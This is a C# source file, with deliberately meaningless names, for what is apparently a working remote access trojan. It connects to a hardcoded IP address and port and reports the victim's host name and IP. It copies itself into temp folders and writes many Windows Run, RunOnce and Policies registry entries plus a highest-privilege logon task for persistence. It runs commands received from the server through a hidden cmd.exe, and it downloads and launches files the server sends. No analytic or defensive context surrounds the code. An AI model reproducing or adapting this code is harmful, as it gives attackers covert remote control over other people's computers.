using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

class A
{
    public static void Main()
    {
        string a1 = "193.58.121.250";
        int a2 = 7175;
        TcpClient b = new TcpClient(a1, a2);
        NetworkStream c = b.GetStream();

        D();

        new Thread(() => E(c)).Start();
        new Thread(() => F(c)).Start();

        string g = H();
        byte[] i = Encoding.UTF8.GetBytes(g);
        c.Write(i, 0, i.Length);

        while (true)
        {
            byte[] j = Encoding.UTF8.GetBytes("1");
            c.Write(j, 0, j.Length);
            Thread.Sleep(30000);
        }
    }

    private static void D()
    {
        string a3 = Application.ExecutablePath;

        for (int a4 = 0; a4 < 3; a4++)
        {
            string a5 = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            Directory.CreateDirectory(a5);

            string a6 = Path.Combine(a5, Path.GetFileName(a3));
            File.Copy(a3, a6, true);

            I(a6);
        }

        I(a3);
    }

    private static void I(string j)
    {
        try
        {
            // Add to registry (Auto-start)
            using (RegistryKey k = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            using (RegistryKey k = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            // Add to RunOnce (Startup)
            using (RegistryKey k = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            using (RegistryKey k = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            // Add to RunServices (Startup)
            using (RegistryKey k = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            using (RegistryKey k = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            // Add to Policies/Explorer (Persistent startup)
            using (RegistryKey k = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            using (RegistryKey k = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true))
            {
                k.SetValue(Path.GetFileNameWithoutExtension(j), j);
            }

            // Schedule task on login (schtasks)
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/Create /SC ONLOGON /TN \"{Path.GetFileNameWithoutExtension(j)}Task\" /TR \"{j}\" /RL HIGHEST",
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        catch { }
    }

    private static string H()
    {
        string a7 = System.Net.Dns.GetHostName();
        string a8 = "";

        foreach (var a9 in System.Net.Dns.GetHostEntry(a7).AddressList)
        {
            if (a9.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            {
                a8 = a9.ToString();
                break;
            }
        }

        return $"{a8}_{a7}";
    }

    private static void E(NetworkStream c)
    {
        byte[] a10 = new byte[1024];

        while (true)
        {
            try
            {
                int a11 = c.Read(a10, 0, a10.Length);
                if (a11 > 0)
                {
                    string a12 = Encoding.UTF8.GetString(a10, 0, a11);
                    J(a12);
                }
            }
            catch { break; }
        }
    }

    private static void J(string a13)
    {
        try
        {
            ProcessStartInfo a14 = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {a13}",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(a14);
        }
        catch { }
    }

    private static void F(NetworkStream c)
    {
        byte[] a15 = new byte[1024];
        int a16;

        while (true)
        {
            try
            {
                a16 = c.Read(a15, 0, a15.Length);
                if (a16 > 0)
                {
                    string a17 = Encoding.UTF8.GetString(a15, 0, a16).TrimEnd('\0');

                    a16 = c.Read(a15, 0, a15.Length);
                    if (a16 > 0)
                    {
                        string a18 = K();

                        string a19 = Path.Combine(a18, a17);
                        File.WriteAllBytes(a19, a15.Take(a16).ToArray());

                        L(a19);
                    }
                }
            }
            catch { break; }

            Thread.Sleep(10000);
        }
    }

    private static string K()
    {
        string a20 = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

        try
        {
            Directory.CreateDirectory(a20);
            return a20;
        }
        catch
        {
            return Path.GetTempPath();
        }
    }

    private static void L(string a21)
    {
        try
        {
            if (File.Exists(a21))
            {
                Process.Start("cmd.exe", $"/c start \"\" \"{a21}\"");
            }
        }
        catch { }
    }
}
